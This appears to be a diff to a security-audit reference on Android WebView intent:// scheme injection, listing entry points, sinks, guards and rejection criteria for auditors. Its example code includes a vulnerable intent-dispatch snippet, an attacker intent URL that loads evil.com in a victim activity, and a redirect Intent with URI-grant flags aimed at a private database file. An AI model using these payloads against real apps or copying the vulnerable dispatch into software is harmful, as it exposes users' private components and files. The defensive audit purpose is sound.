@@ -1,51 +1,41 @@
-# Pattern: WebView Intent Scheme Injection
+# Pattern: WebView Intent Scheme
 
-## When To Use
+## Match
 
-Use this reference when attacker-controlled WebView content reaches `intent://`, custom scheme parsing, or native dispatch from WebView callbacks.
+WebView dispatches `intent://` URLs to `startActivity` / `Intent.parseUri`. The attacker-controlled `intent://` payload carries `component`/`package`/`selector`/`S.<key>=<value>` extras/`FLAG_GRANT_*` flags/`ClipData` that `Intent.parseUri` does not strip. **Non-obvious**: pre-API 30, `FLAG_GRANT_*` flags travel through `Intent.parseUri` and let an untrusted WebView reach non-exported victim Activities with grants. AOSP stripped `FLAG_GRANT_*` from parser starting API 30+.
 
-## Core Concept
+## Analyze
 
-Untrusted web content controls native `Intent` dispatch from WebView, crossing from web origin into app/component privileges without target validation.
+- entry: `WebViewClient.shouldOverrideUrlLoading`, `WebChromeClient.onCreateWindow`, `WebView.loadUrl(attackerUrl)`, attacker-controlled deep-link query
+- control: `intent://` URL, target `component` / `package`, `S.<key>` extras, `FLAG_GRANT_*` flags, `ClipData`, source URL, source frame
+- sink: `Intent.parseUri(url, URI_INTENT_SCHEME)` → `startActivity`, native bridge, `WebView.loadUrl("javascript:...")` triggered from a `file://` page, deep-link route reached from the parsed Intent
+- guard: `shouldOverrideUrlLoading` rejects `intent://` (`return true` without dispatch), never call `Intent.parseUri` on WebView-originated URLs, allowlist for `http(s)://` only, do not use JS bridge to dispatch `intent://` URLs
+- impact: launch non-exported Activity/Service/Receiver, grant attacker read/write to `content://` provider, bypass internal business logic, chain into intent redirect or parser split
 
-**Sources**
-- attacker-controlled WebView URL/HTML/redirect/script; `shouldOverrideUrlLoading`, URL handlers, custom scheme routers; `Intent.parseUri`, URI parsers, route dispatch helpers.
+## Reject
 
-**Sinks**
-- `startActivity`, `startService`, `sendBroadcast`, `bindService`; `Intent.parseUri`, custom route launchers, grant-preserving dispatch.
+Reject when the WebView never calls `Intent.parseUri` on WebView-originated URLs, the WebView is restricted to `http(s)://` allowlist, and no JS bridge reaches `Intent.parseUri`.
 
-## Guards & Rejection
+## Codes
 
-Safe when: only exact trusted schemes/hosts dispatch, parsed intents are stripped of explicit components/selectors/grants, and final targets are allowlisted.
-
-Reject when: scheme parsing only opens harmless external apps, non-allowlisted schemes are blocked before parsing, or no security-relevant native target is reached.
-
-## Rating
-
-- HIGH: private/protected component or grant reached.
-- MEDIUM: bounded unauthorized native action.
-- LOW: external-app launch or UI-only deception.
-- IGNORED: no native security impact.
-
-## Trace Commands
-
-```bash
-decx code method-source "<webviewUrlOverride>" -P <port>
-decx code method-context "<nativeSchemeRouter>" -P <port>
+```java
+// WebView dispatches intent:// to startActivity — attacker reaches a non-exported victim Activity
+if ("intent".equals(uri.getScheme())) startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
 ```
-
-## Example Shapes
-
-Suspicious:
 
 ```text
-attacker-controlled URL with intent:// scheme -> WebView parses and launches -> reaches exported native component with sensitive behavior
+# attacker URL — selector + component + S. extras + grant flags travel through parseUri
+intent:#Intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;B.intent=...;end
 ```
 
-Safe:
-
-```text
-shouldOverrideUrlLoading blocks intent:// and custom schemes -> or strict component allowlist filters the resolved target
+```java
+// attacker builds a redirect Intent that carries grant flag + content://
+next.setClassName("com.victim", "com.victim.ui.WebViewActivity");
+next.setData(Uri.parse("content://com.victim.fileprovider/.../secret.db"));
+next.setFlags(FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION);
 ```
 
-Report guidance -- Use: "Attacker-controlled WebView content can trigger native Intent dispatch without stripping or validating dangerous target fields." Avoid: "WebView handles intent:// URLs" without proving the resolved component exposes protected behavior.
+```java
+// loadUrl with intent:// from inside an attacker page
+webView.loadUrl("intent:#Intent;component=com.victim/.PrivateActivity;end");
+```
